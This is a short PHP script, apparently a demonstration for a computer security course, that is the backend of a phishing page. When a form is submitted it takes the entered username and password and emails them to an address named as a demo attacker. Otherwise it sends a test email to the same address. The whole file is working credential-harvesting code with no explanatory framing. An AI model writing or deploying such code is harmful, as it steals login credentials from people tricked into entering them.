<?php

if ( isset( $_POST['submit'])) {
    $username = $_REQUEST['name'];
    $password = $_REQUEST['pass'];

    $msg = "Username: $username \n Password: $password";
    mail("comp590.demo.attacker@gmail.com", "User details", $msg);

} else {
    mail("comp590.demo.attacker@gmail.com", "Test email", "Testing.");
}
